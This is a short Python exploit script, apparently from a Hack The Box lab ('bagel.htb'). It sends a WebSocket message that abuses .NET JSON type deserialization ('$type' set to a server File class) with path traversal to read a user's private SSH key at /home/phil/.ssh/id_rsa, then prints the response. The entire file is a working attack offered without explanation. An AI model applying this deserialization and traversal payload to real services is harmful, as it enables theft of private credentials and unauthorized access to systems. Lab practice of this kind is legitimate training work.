import websocket
import json

ws = websocket.WebSocket()

ws.connect("ws://bagel.htb:5000/")

order =  { "RemoveOrder" : {"$type":"bagel_server.File, bagel", "ReadFile":"../../../../../../home/phil/.ssh/id_rsa"}}
data = str(json.dumps(order))

ws.send(data)

result = ws.recv()
print(result) 
